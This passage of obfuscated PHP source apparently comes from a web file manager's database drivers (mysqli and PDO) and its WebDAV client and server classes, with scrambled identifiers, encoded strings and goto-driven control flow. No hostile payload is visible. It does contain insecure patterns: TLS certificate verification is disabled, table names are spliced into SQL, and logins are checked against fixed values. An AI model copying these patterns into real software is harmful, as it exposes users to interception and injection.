close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $DÏçŸÙë»« =& $_SERVER[©]; $this->error = $this->_linkID->errno . $DÏçŸÙë»«[14] . $this->_linkID->error; if ($DÏçŸÙë»«[43] != $this->queryStr) { $this->error .= LNG($DÏçŸÙë»«[55]) . $this->queryStr; } think_trace($this->error, $DÏçŸÙë»«[43], $DÏçŸÙë»«[56]); return $this->error; } public function escapeString($b’ŸÁÄ›É) { if ($this->_linkID) { return $this->_linkID->real_escape_string($b’ŸÁÄ›É); } else { return addslashes($b’ŸÁÄ›É); } } public function parseKey(&$fÀ³ƒŒÕ¯Ö, $Cê‚‘´ƒ¬‰ = true) { $dµÒ¸¿Ì§ä =& $_SERVER[©]; if ($Cê‚‘´ƒ¬‰) { $fÀ³ƒŒÕ¯Ö = $this->parseKeyCheck($fÀ³ƒŒÕ¯Ö); } if ($fÀ³ƒŒÕ¯Ö != $dµÒ¸¿Ì§ä[186] && !preg_match($dµÒ¸¿Ì§ä[820], $fÀ³ƒŒÕ¯Ö)) { $fÀ³ƒŒÕ¯Ö = $dµÒ¸¿Ì§ä[821] . trim($fÀ³ƒŒÕ¯Ö, $dµÒ¸¿Ì§ä[821]) . $dµÒ¸¿Ì§ä[821]; } return $fÀ³ƒŒÕ¯Ö; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($eºôï“ô¿ô = '') { $AÔ¢áñ‹Î =& $_SERVER[©]; if (!class_exists($AÔ¢áñ‹Î[823])) { think_exception(think_lang($AÔ¢áñ‹Î[20]) . $AÔ¢áñ‹Î[824]); } if (!empty($eºôï“ô¿ô)) { $this->config = $eºôï“ô¿ô; if (empty($this->config[$AÔ¢áñ‹Î[23]])) { $this->config[$AÔ¢áñ‹Î[23]] = array(); } } } public function connect($CŠå§™‡öŒ = '', $Cß©ÀŸ‘‹Ç = 0) { $F›™‹óãé‡ =& $_SERVER[©]; if (!isset($this->linkID[$Cß©ÀŸ‘‹Ç])) { goto bÖ…Àİº”; DÕÏµìĞ¨œ: $this->linkID[$Cß©ÀŸ‘‹Ç]->exec($F›™‹óãé‡[834] . think_config($F›™‹óãé‡[801])); $this->connected = !0; if (1 != think_config($F›™‹óãé‡[28])) { unset($this->config); } goto e‰È®•‘ù÷; bÖ…Àİº”: if (empty($CŠå§™‡öŒ)) { $CŠå§™‡öŒ = $this->config; } if ($this->pconnect) { $CŠå§™‡öŒ[$F›™‹óãé‡[23]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Cß©ÀŸ‘‹Ç] = new PDO($CŠå§™‡öŒ[$F›™‹óãé‡[825]], $CŠå§™‡öŒ[$F›™‹óãé‡[798]], $CŠå§™‡öŒ[$F›™‹óãé‡[799]], $CŠå§™‡öŒ[$F›™‹óãé‡[23]]); } catch (PDOException $b§º“µ„Û) { think_exception($b§º“µ„Û->getMessage()); } goto DˆíÍµˆøæ; DˆíÍµˆøæ: $this->dbType = $this->_getDsnType($CŠå§™‡öŒ[$F›™‹óãé‡[825]]); if (in_array($this->dbType, array($F›™‹óãé‡[826], $F›™‹óãé‡[827], $F›™‹óãé‡[828], $F›™‹óãé‡[829]))) { think_exception($F›™‹óãé‡[830] . $this->dbType . $F›™‹óãé‡[831] . $this->dbType . $F›™‹óãé‡[832]); } if (!$this->linkID[$Cß©ÀŸ‘‹Ç]) { think_exception($F›™‹óãé‡[833]); } goto DÕÏµìĞ¨œ; e‰È®•‘ù÷: } return $this->linkID[$Cß©ÀŸ‘‹Ç]; } public function free() { $this->PDOStatement = null; } public function query($eôÅ¬Àèï, $B‘ï¿²”ñ = array()) { goto e•²®ÌÃ‹Æ; CÒ©ñ×‡šÉ: think_action_status($cìÏÈËĞÂÚ[29], 1); think_status($cìÏÈËĞÂÚ[30]); $this->PDOStatement = $this->_linkID->prepare($eôÅ¬Àèï); goto a¤´£‹œö­; d›³†ÑÌÔ¾: if (!1 === $e“À¸›ÅŒ) { $this->error(); return !1; } else { return $this->getAll(); } goto FŠ´ÉùšŒÍ; F„ˆÃÅ·çº: $this->queryStr = $eôÅ¬Àèï; if (!empty($B‘ï¿²”ñ)) { $this->queryStr .= $cìÏÈËĞÂÚ[835] . print_r($B‘ï¿²”ñ, !0) . $cìÏÈËĞÂÚ[836]; } if (!empty($this->PDOStatement)) { $this->free(); } goto CÒ©ñ×‡šÉ; e•²®ÌÃ‹Æ: $cìÏÈËĞÂÚ =& $_SERVER[©]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F„ˆÃÅ·çº; a¤´£‹œö­: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $e“À¸›ÅŒ = $this->PDOStatement->execute($B‘ï¿²”ñ); $this->debug(); goto d›³†ÑÌÔ¾; FŠ´ÉùšŒÍ: } public function execute($A»÷óÃô±, $bÕÃİ×»ÜÔ = array()) { goto bİ®†æÒ¦°; E½š ø†»§: think_status($DõÅÓŠø†î[30]); $this->PDOStatement = $this->_linkID->prepare($A»÷óÃô±); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto a«ïØöíóó; C©Ê‘ÑˆÁâ: $this->queryStr = $A»÷óÃô±; if (!empty($bÕÃİ×»ÜÔ)) { $this->queryStr .= $DõÅÓŠø†î[835] . print_r($bÕÃİ×»ÜÔ, !0) . $DõÅÓŠø†î[836]; } $aÀšÛŒšÙÉ = !1; goto fß§«¦ÙîÖ; bİ®†æÒ¦°: $DõÅÓŠø†î =& $_SERVER[©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C©Ê‘ÑˆÁâ; fß§«¦ÙîÖ: if ($this->dbType == $DõÅÓŠø†î[829]) { if (preg_match($DõÅÓŠø†î[837], $this->queryStr, $dÓƒø•…Ší)) { $this->table = think_config($DõÅÓŠø†î[838]) . str_ireplace(think_config($DõÅÓŠø†î[839]), $DõÅÓŠø†î[13], $dÓƒø•…Ší[2]); $aÀšÛŒšÙÉ = (bool) $this->query($DõÅÓŠø†î[840] . strtoupper($this->table) . $DõÅÓŠø†î[65]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($DõÅÓŠø†î[31], 1); goto E½š ø†»§; a«ïØöíóó: $dŒ‘»±¯™¾ = $this->PDOStatement->execute($bÕÃİ×»ÜÔ); $this->debug(); if (!1 === $dŒ‘»±¯™¾) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($aÀšÛŒšÙÉ || preg_match($DõÅÓŠø†î[841], $A»÷óÃô±)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto b©™é…ÙÍ; b©™é…ÙÍ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c„Ã‘µˆ… = $this->_linkID->commit(); $this->transTimes = 0; if (!$c„Ã‘µˆ…) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $EæŒéÉ”Ùë = $this->_linkID->rollback(); $this->transTimes = 0; if (!$EæŒéÉ”Ùë) { $this->error(); return !1; } } return !0; } private function getAll() { $a«©éå©À† = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($a«©éå©À†); return $a«©éå©À†; } public function getFields($BŞë¿£ËÂÆ) { goto E‘‘è”±“²; B‚ÊÁáÎä: return $eÖ—„„¬Ò ; goto D¯™õÂÚ¨Ş; DÅ‚ç˜‚ï: $dôŒÍòÄÌÃ = $this->query($CÂá¿Ñ…ˆ…); $eÖ—„„¬Ò  = array(); if ($dôŒÍòÄÌÃ) { foreach ($dôŒÍòÄÌÃ as $EÜİøë¾”› => $Aã—ƒ‹ƒ®Ø) { $Aã—ƒ‹ƒ®Ø = array_change_key_case($Aã—ƒ‹ƒ®Ø); $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[38]] = isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[38]]) ? $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[38]] : $f¦ğ–¤Æ¸™[13]; $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[39]] = isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[39]]) ? $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[39]] : $f¦ğ–¤Æ¸™[13]; $d¨‘£‰°Åâ = isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[270]]) ? $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[270]] : $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[38]]; $eÖ—„„¬Ò [$d¨‘£‰°Åâ] = array($f¦ğ–¤Æ¸™[38] => $d¨‘£‰°Åâ, $f¦ğ–¤Æ¸™[39] => $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[39]], $f¦ğ–¤Æ¸™[41] => (bool) (isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[109]]) && $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[109]] === $f¦ğ–¤Æ¸™[43] || isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[41]]) && $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[41]] === $f¦ğ–¤Æ¸™[43]), $f¦ğ–¤Æ¸™[44] => isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[44]]) ? $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[44]] : (isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[63]]) ? $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[63]] : $f¦ğ–¤Æ¸™[13]), $f¦ğ–¤Æ¸™[46] => isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[99]]) ? strtolower($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[99]]) == $f¦ğ–¤Æ¸™[48] : (isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[64]]) ? $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[64]] : !1), $f¦ğ–¤Æ¸™[49] => isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[858]]) ? strtolower($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[858]]) == $f¦ğ–¤Æ¸™[51] : (isset($Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[99]]) ? $Aã—ƒ‹ƒ®Ø[$f¦ğ–¤Æ¸™[99]] : !1)); } } goto B‚ÊÁáÎä; E‘‘è”±“²: $f¦ğ–¤Æ¸™ =& $_SERVER[©]; $this->initConnect(!0); if (think_config($f¦ğ–¤Æ¸™[842])) { $CÂá¿Ñ…ˆ… = str_replace($f¦ğ–¤Æ¸™[843], $BŞë¿£ËÂÆ, think_config($f¦ğ–¤Æ¸™[842])); } else { switch ($this->dbType) { case $f¦ğ–¤Æ¸™[826]: case $f¦ğ–¤Æ¸™[844]: $CÂá¿Ñ…ˆ… = "\x53\105\x4c\105\103\124\x20\x20\40\x63\x6f\154\x75\155\156\137\156\141\155\x65\40\141\163\x20\x27\x4e\141\x6d\145\47\x2c\40\x20\40\144\x61\x74\x61\x5f\164\x79\160\145\40\x61\163\40\47\x54\x79\x70\x65\x27\54\40\40\40\x63\x6f\x6c\165\x6d\x6e\x5f\x64\145\146\x61\x75\154\x74\40\x61\163\40\47\x44\145\x66\x61\165\x6c\164\x27\54\x20\x20\40\x69\x73\x5f\x6e\165\154\x6c\141\142\154\145\x20\141\163\x20\x27\116\x75\154\154\x27\xa\x9\11\106\122\x4f\115\11\151\x6e\x66\157\x72\x6d\x61\164\151\x6f\156\x5f\163\x63\150\x65\x6d\x61\56\x74\141\x62\154\x65\163\x20\101\x53\40\x74\xa\11\11\x4a\117\111\x4e\x9\x69\156\146\x6f\x72\155\x61\x74\151\x6f\x6e\x5f\x73\143\x68\x65\x6d\141\x2e\143\157\154\x75\155\156\x73\40\x41\x53\x20\143\12\11\11\117\116\40\x20\164\x2e\x74\141\x62\154\x65\x5f\143\x61\x74\x61\x6c\x6f\x67\x20\x3d\x20\143\56\x74\141\x62\x6c\x65\137\x63\141\x74\141\154\x6f\x67\xa\x9\x9\101\116\x44\40\x74\x2e\x74\141\x62\154\x65\137\163\x63\150\x65\155\141\40\x3d\x20\143\56\x74\x61\x62\x6c\x65\137\163\x63\150\145\155\141\12\11\x9\x41\x4e\104\40\x74\x2e\164\141\x62\154\x65\137\x6e\141\155\145\x20\x3d\40\143\x2e\x74\x61\x62\x6c\145\137\156\x61\x6d\145\xa\11\x9\x57\110\105\122\x45\40\40\40\x74\56\x74\141\142\x6c\145\x5f\x6e\x61\155\x65\x20\x3d\40\x27{$BŞë¿£ËÂÆ}\x27"; break; case $f¦ğ–¤Æ¸™[845]: $CÂá¿Ñ…ˆ… = $f¦ğ–¤Æ¸™[846] . $BŞë¿£ËÂÆ . $f¦ğ–¤Æ¸™[847]; break; case $f¦ğ–¤Æ¸™[827]: case $f¦ğ–¤Æ¸™[829]: $CÂá¿Ñ…ˆ… = $f¦ğ–¤Æ¸™[848] . $f¦ğ–¤Æ¸™[849] . $f¦ğ–¤Æ¸™[850] . strtoupper($BŞë¿£ËÂÆ) . $f¦ğ–¤Æ¸™[851] . strtoupper($BŞë¿£ËÂÆ) . $f¦ğ–¤Æ¸™[852]; break; case $f¦ğ–¤Æ¸™[853]: $CÂá¿Ñ…ˆ… = $f¦ğ–¤Æ¸™[854] . $BŞë¿£ËÂÆ . $f¦ğ–¤Æ¸™[855]; break; case $f¦ğ–¤Æ¸™[828]: break; case $f¦ğ–¤Æ¸™[856]: default: $CÂá¿Ñ…ˆ… = $f¦ğ–¤Æ¸™[857] . ($this->dbType == $f¦ğ–¤Æ¸™[856] ? "\x60{$BŞë¿£ËÂÆ}\140" : $BŞë¿£ËÂÆ); } } goto DÅ‚ç˜‚ï; D¯™õÂÚ¨Ş: } public function getTables($Bäö´İÉ¼ = '') { $dÍ†ˆ‰ÏÄ¼ =& $_SERVER[©]; if (think_config($dÍ†ˆ‰ÏÄ¼[859])) { $B…Ò†³ñ£ = str_replace($dÍ†ˆ‰ÏÄ¼[860], $Bäö´İÉ¼, think_config($dÍ†ˆ‰ÏÄ¼[859])); } else { switch ($this->dbType) { case $dÍ†ˆ‰ÏÄ¼[827]: case $dÍ†ˆ‰ÏÄ¼[829]: $B…Ò†³ñ£ = $dÍ†ˆ‰ÏÄ¼[861]; break; case $dÍ†ˆ‰ÏÄ¼[826]: case $dÍ†ˆ‰ÏÄ¼[844]: $B…Ò†³ñ£ = $dÍ†ˆ‰ÏÄ¼[862]; break; case $dÍ†ˆ‰ÏÄ¼[853]: $B…Ò†³ñ£ = $dÍ†ˆ‰ÏÄ¼[863]; break; case $dÍ†ˆ‰ÏÄ¼[828]: think_exception(think_lang($dÍ†ˆ‰ÏÄ¼[864]) . $dÍ†ˆ‰ÏÄ¼[865]); break; case $dÍ†ˆ‰ÏÄ¼[845]: $B…Ò†³ñ£ = $dÍ†ˆ‰ÏÄ¼[52] . $dÍ†ˆ‰ÏÄ¼[53] . $dÍ†ˆ‰ÏÄ¼[54]; break; case $dÍ†ˆ‰ÏÄ¼[856]: default: if (!empty($Bäö´İÉ¼)) { $B…Ò†³ñ£ = $dÍ†ˆ‰ÏÄ¼[809] . $Bäö´İÉ¼; } else { $B…Ò†³ñ£ = $dÍ†ˆ‰ÏÄ¼[810]; } } } $fœÁÀˆÕ† = $this->query($B…Ò†³ñ£); $CÑ¥ÃÉŠ‹ = array(); foreach ($fœÁÀˆÕ† as $D…³š“¨ => $C•Èä´¹Ğ) { $CÑ¥ÃÉŠ‹[$D…³š“¨] = current($C•Èä´¹Ğ); } return $CÑ¥ÃÉŠ‹; } protected function parseLimit($aŠÅõ†ãÆŒ) { $E¼ª¡Úã‚– =& $_SERVER[©]; $cŸÜ„Î°ºß = $E¼ª¡Úã‚–[43]; if (!empty($aŠÅõ†ãÆŒ)) { switch ($this->dbType) { case $E¼ª¡Úã‚–[853]: case $E¼ª¡Úã‚–[845]: $aŠÅõ†ãÆŒ = explode($E¼ª¡Úã‚–[57], $aŠÅõ†ãÆŒ); if (count($aŠÅõ†ãÆŒ) > 1) { $cŸÜ„Î°ºß .= $E¼ª¡Úã‚–[58] . $aŠÅõ†ãÆŒ[1] . $E¼ª¡Úã‚–[59] . $aŠÅõ†ãÆŒ[0] . $E¼ª¡Úã‚–[60]; } else { $cŸÜ„Î°ºß .= $E¼ª¡Úã‚–[58] . $aŠÅõ†ãÆŒ[0] . $E¼ª¡Úã‚–[60]; } break; case $E¼ª¡Úã‚–[826]: case $E¼ª¡Úã‚–[844]: break; case $E¼ª¡Úã‚–[828]: break; case $E¼ª¡Úã‚–[827]: case $E¼ª¡Úã‚–[829]: break; case $E¼ª¡Úã‚–[856]: default: $cŸÜ„Î°ºß .= $E¼ª¡Úã‚–[58] . $aŠÅõ†ãÆŒ . $E¼ª¡Úã‚–[60]; } } return $cŸÜ„Î°ºß; } public function parseKey(&$DáÁ‚Ä á¸, $DŠÁ‹µôë = true) { $CÀÁ¶èÚ’ =& $_SERVER[©]; if ($DŠÁ‹µôë) { $DáÁ‚Ä á¸ = $this->parseKeyCheck($DáÁ‚Ä á¸); } if ($this->dbType == $CÀÁ¶èÚ’[856]) { if ($DáÁ‚Ä á¸ != $CÀÁ¶èÚ’[186] && !preg_match($CÀÁ¶èÚ’[820], $DáÁ‚Ä á¸)) { $DáÁ‚Ä á¸ = $CÀÁ¶èÚ’[821] . trim($DáÁ‚Ä á¸, $CÀÁ¶èÚ’[821]) . $CÀÁ¶èÚ’[821]; } return $DáÁ‚Ä á¸; } else { return parent::parseKey($DáÁ‚Ä á¸); } } public function close() { $this->_linkID = null; } public function error() { $AÔßÜ½ÎÆŒ =& $_SERVER[©]; if ($this->PDOStatement) { $c”ˆªİ½ÏÖ = $this->PDOStatement->errorInfo(); $this->error = $c”ˆªİ½ÏÖ[1] . $AÔßÜ½ÎÆŒ[14] . $c”ˆªİ½ÏÖ[2]; } else { $this->error = $AÔßÜ½ÎÆŒ[43]; } if ($AÔßÜ½ÎÆŒ[43] != $this->queryStr) { $this->error .= LNG($AÔßÜ½ÎÆŒ[55]) . $this->queryStr; } think_trace($this->error, $AÔßÜ½ÎÆŒ[43], $AÔßÜ½ÎÆŒ[56]); return $this->error; } public function escapeString($A‘Óß®¤Ü) { $eÚ»ÍÛ£­ =& $_SERVER[©]; switch ($this->dbType) { case $eÚ»ÍÛ£­[853]: case $eÚ»ÍÛ£­[826]: case $eÚ»ÍÛ£­[844]: case $eÚ»ÍÛ£­[856]: return addslashes($A‘Óß®¤Ü); case $eÚ»ÍÛ£­[828]: case $eÚ»ÍÛ£­[845]: case $eÚ»ÍÛ£­[827]: case $eÚ»ÍÛ£­[829]: return str_ireplace($eÚ»ÍÛ£­[65], $eÚ»ÍÛ£­[66], $A‘Óß®¤Ü); } } protected function parseValue($cù½Å¼Éø) { $A„’¥„âä  =& $_SERVER[©]; if (is_string($cù½Å¼Éø)) { $cù½Å¼Éø = strpos($cù½Å¼Éø, $A„’¥„âä [14]) === 0 ? $this->escapeString($cù½Å¼Éø) : $A„’¥„âä [866] . $this->escapeString($cù½Å¼Éø) . $A„’¥„âä [866]; } elseif (isset($cù½Å¼Éø[0]) && is_string($cù½Å¼Éø[0]) && strtolower($cù½Å¼Éø[0]) == $A„’¥„âä [294]) { $cù½Å¼Éø = $this->escapeString($cù½Å¼Éø[1]); } elseif (is_array($cù½Å¼Éø)) { $cù½Å¼Éø = array_map(array($this, $A„’¥„âä [867]), $cù½Å¼Éø); } elseif (is_bool($cù½Å¼Éø)) { $cù½Å¼Éø = $cù½Å¼Éø ? $A„’¥„âä [93] : $A„’¥„âä [476]; } elseif (is_null($cù½Å¼Éø)) { $cù½Å¼Éø = $A„’¥„âä [109]; } return $cù½Å¼Éø; } public function getLastInsertId() { $D•‚Ñè±†Á =& $_SERVER[©]; switch ($this->dbType) { case $D•‚Ñè±†Á[853]: case $D•‚Ñè±†Á[845]: case $D•‚Ñè±†Á[826]: case $D•‚Ñè±†Á[844]: case $D•‚Ñè±†Á[828]: case $D•‚Ñè±†Á[856]: return $this->_linkID->lastInsertId(); case $D•‚Ñè±†Á[827]: case $D•‚Ñè±†Á[829]: $fÕ–ëÏçøŠ = $this->table; $aù÷ËùŠ¨› = $this->query("\123\105\x4c\x45\103\124\40{$fÕ–ëÏçøŠ}\56\x63\x75\162\x72\x76\141\154\x20\x63\165\162\162\166\141\x6c\40\106\122\117\x4d\x20\144\x75\x61\x6c"); return $aù÷ËùŠ¨› ? $aù÷ËùŠ¨›[0][$D•‚Ñè±†Á[868]] : 0; } } } goto Fì¯Ãº¹ŒÅ; D®Ì²”öÕ¾: class HttpAuth { public static function get() { $F÷‰Œ«Ê¿º =& $_SERVER[©]; $d‚ÕÉÇ¼—ã = $F÷‰Œ«Ê¿º[43]; $DÀÔá‹•’ = $F÷‰Œ«Ê¿º[43]; if (isset($_SERVER[$F÷‰Œ«Ê¿º[1757]])) { $d‚ÕÉÇ¼—ã = $_SERVER[$F÷‰Œ«Ê¿º[1757]]; $DÀÔá‹•’ = $_SERVER[$F÷‰Œ«Ê¿º[1758]]; } elseif (isset($_SERVER[$F÷‰Œ«Ê¿º[1759]])) { $F×Ö§ÅØõ¯ = $_SERVER[$F÷‰Œ«Ê¿º[1759]]; if (strpos(strtolower($F×Ö§ÅØõ¯), $F÷‰Œ«Ê¿º[1760]) === 0) { $d»èíøÀ”è = explode($F÷‰Œ«Ê¿º[14], base64_decode(substr($F×Ö§ÅØõ¯, 6))); $d‚ÕÉÇ¼—ã = isset($d»èíøÀ”è[0]) ? $d»èíøÀ”è[0] : $F÷‰Œ«Ê¿º[43]; $DÀÔá‹•’ = isset($d»èíøÀ”è[1]) ? $d»èíøÀ”è[1] : 0; } } return array($F÷‰Œ«Ê¿º[543] => $d‚ÕÉÇ¼—ã, $F÷‰Œ«Ê¿º[894] => $DÀÔá‹•’); } public static function error() { goto AÙ©èÙ¾Ê§; fŠìØÈ²™: die; goto d—„—¼…Ğ¿; AÙ©èÙ¾Ê§: $DŒƒ·Ç‹¹Š =& $_SERVER[©]; header($DŒƒ·Ç‹¹Š[1761]); header($DŒƒ·Ç‹¹Š[1762]); goto fâåÜ“¢ÎÆ; fâåÜ“¢ÎÆ: header($DŒƒ·Ç‹¹Š[1763]); header($DŒƒ·Ç‹¹Š[1764]); header($DŒƒ·Ç‹¹Š[1260]); goto fŠìØÈ²™; d—„—¼…Ğ¿: } public static function make($A¹™â‹Ê¨, $B‚ğÚƒİÆ) { $a•Š×À„¼ =& $_SERVER[©]; return $a•Š×À„¼[1765] + base64_encode($A¹™â‹Ê¨ . $a•Š×À„¼[14] . $B‚ğÚƒİÆ); } } class HttpDavClient { public function __construct($Aëç÷­•…, $c®é†§³–½, $aÀ‹Áë†Áæ) { $this->header = array(); $this->userName = $c®é†§³–½; $this->userPassowrd = $aÀ‹Áë†Áæ; } protected function makePath($a¥¨ËàÜ‘‘) { return $a¥¨ËàÜ‘‘; } protected function setHeader($E©§‰¤Ê¶‘, $A¶óÖæîãæ = false) { if ($A¶óÖæîãæ === !1) { $this->header[] = $E©§‰¤Ê¶‘; } else { $this->header[] = $E©§‰¤Ê¶‘ . $_SERVER[©][877] . $A¶óÖæîãæ; } } public function move($bëšˆÒÒ¿, $bµéï“ìÛ, $DÏ²Š›æÜ„ = '') { $D¹ŞÂø™îÇ =& $_SERVER[©]; $this->setHeader($D¹ŞÂø™îÇ[1766], $this->makePath($bµéï“ìÛ)); $this->setHeader($D¹ŞÂø™îÇ[1767], $D¹ŞÂø™îÇ[1768]); if ($DÏ²Š›æÜ„) { $this->setHeader($D¹ŞÂø™îÇ[1769], $D¹ŞÂø™îÇ[922] . $DÏ²Š›æÜ„ . $D¹ŞÂø™îÇ[925]); } return $this->send($D¹ŞÂø™îÇ[1770], $bëšˆÒÒ¿); } public function copy($f®¤†Éä›¹, $b´¦ß¿Ş˜Œ) { $A¯Û‡âˆ¾ó =& $_SERVER[©]; $this->setHeader($A¯Û‡âˆ¾ó[1766], $this->makePath($b´¦ß¿Ş˜Œ)); $this->setHeader($A¯Û‡âˆ¾ó[1767], $A¯Û‡âˆ¾ó[1768]); return $this->send($A¯Û‡âˆ¾ó[1771], $f®¤†Éä›¹); } public function mkcol($B§ŠñÑÃ·) { $ešˆå‚ëÃÁ =& $_SERVER[©]; $this->setHeader($ešˆå‚ëÃÁ[1767], $ešˆå‚ëÃÁ[1768]); return $this->send($ešˆå‚ëÃÁ[1772], $B§ŠñÑÃ·); } public function delete($EŒç¿½–Ä¾, $a»Èƒ’ÑÖÈ = '') { $d†ğª°ƒ„À =& $_SERVER[©]; if ($a»Èƒ’ÑÖÈ) { $this->setHeader($d†ğª°ƒ„À[1769], $d†ğª°ƒ„À[922] . $a»Èƒ’ÑÖÈ . $d†ğª°ƒ„À[925]); } return $this->send($d†ğª°ƒ„À[1248], $EŒç¿½–Ä¾); } public function propfind($A—æÅ¹Û´Å) { $f›‹ñ–¥Ã„ =& $_SERVER[©]; $this->setHeader($f›‹ñ–¥Ã„[1773], $f›‹ñ–¥Ã„[93]); $this->setHeader($f›‹ñ–¥Ã„[1774], $f›‹ñ–¥Ã„[1775]); $fìÜŸàò„Ï = $f›‹ñ–¥Ã„[1776]; return $this->send($f›‹ñ–¥Ã„[1777], $A—æÅ¹Û´Å, $fìÜŸàò„Ï); } public function options($CŒƒÒÈê²Ù) { return $this->send($_SERVER[©][1778], $CŒƒÒÈê²Ù); } public function get($f¢œéêÙ¿‚) { return $this->send($_SERVER[©][226], $f¢œéêÙ¿‚); } public function put($Báù÷ˆ¦±İ, $eØº”±Ç°•, $eã¼Öš±›Õ = '') { $dä†¤„Û” =& $_SERVER[©]; if ($eã¼Öš±›Õ) { $this->setHeader($dä†¤„Û”[1769], $dä†¤„Û”[922] . $eã¼Öš±›Õ . $dä†¤„Û”[925]); } return $this->send($dä†¤„Û”[224], $Báù÷ˆ¦±İ, $eØº”±Ç°•); } protected function send($FôğÏÍŠÓ, $fÒ×¿Åá¯…, $E…ƒÉãËÚÕ = false, $EêÆĞ´Äïğ = false) { goto d”ƒ»Ù±™é; d”ƒ»Ù±™é: $dôåå ‚‚Ö =& $_SERVER[©]; $A¾À§å“íÉ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($dôåå ‚‚Ö[1779], $dôåå ‚‚Ö[60]); goto C½ÕÊŸ“ï„; DõŞÖ×‘Ó: curl_setopt($aÊ¶´äÄËØ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($aÊ¶´äÄËØ, CURLOPT_SSL_VERIFYHOST, !1); $câÓ§Å±§º = curl_exec($aÊ¶´äÄËØ); goto eÑÑÜƒÙøË; eÑÑÜƒÙøË: $this->header = array(); return $câÓ§Å±§º; goto cŒ´ÕòŠ³; dŞï­øÊĞÓ: $aÊ¶´äÄËØ = curl_init($fÒ×¿Åá¯…); curl_setopt($aÊ¶´äÄËØ, CURLOPT_CUSTOMREQUEST, $FôğÏÍŠÓ); curl_setopt($aÊ¶´äÄËØ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto bå÷Ãõ‹Ô; bå÷Ãõ‹Ô: curl_setopt($aÊ¶´äÄËØ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($aÊ¶´äÄËØ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($aÊ¶´äÄËØ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto DõŞÖ×‘Ó; C½ÕÊŸ“ï„: $this->setHeader($A¾À§å“íÉ); if ($E…ƒÉãËÚÕ) { $E…ƒÉãËÚÕ = $dôåå ‚‚Ö[1780] . $E…ƒÉãËÚÕ; } if (!request_url_safe($fÒ×¿Åá¯…)) { return !1; } goto dŞï­øÊĞÓ; cŒ´ÕòŠ³: } } class HttpDavServer { public function __construct($C¿Æ§’ÒÒ¢, $aä‹² ›™×) { $this->root = $C¿Æ§’ÒÒ¢; $this->initPath($aä‹² ›™×); $this->start(); } public function initPath($AÛÆ¹¾ÚŸ) { $Dî’¼’Œİ =& $_SERVER[©]; $aŸ»–ŞÖ»š = rtrim($_SERVER[$Dî’¼’Œİ[1385]], $Dî’¼’Œİ[18]) . $Dî’¼’Œİ[18]; $this->urlBase = substr($aŸ»–ŞÖ»š, 0, strpos($aŸ»–ŞÖ»š, $AÛÆ¹¾ÚŸ) + 1); $this->urlBase = rtrim($this->urlBase, $Dî’¼’Œİ[18]) . $AÛÆ¹¾ÚŸ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $Dõ“ÆğÚÑØ =& $_SERVER[©]; $BÆÑˆ…²»ç = HttpAuth::get(); if ($BÆÑˆ…²»ç[$Dõ“ÆğÚÑØ[543]] == $Dõ“ÆğÚÑØ[1781] && $BÆÑˆ…²»ç[$Dõ“ÆğÚÑØ[894]] == $Dõ“ÆğÚÑØ[1782]) { return !0; } HttpAuth::error(); } public function start() { goto F¼Š©³•ÕÏ; F¼Š©³•ÕÏ: $Eìßí–—âê =& $_SERVER[©]; $this->checkUser(); $fÏ¶»”ˆ”ã = $Eìßí–—âê[154] . HttpHeader::method(); goto eÆ¡Áù©Í; eÆ¡Áù©Í: if (!method_exists($this, $fÏ¶»”ˆ”ã)) { pr($fÏ¶»”ˆ”ã . $Eìßí–—âê[1783]); die; } $EÒ©´Õ¡ÓĞ = 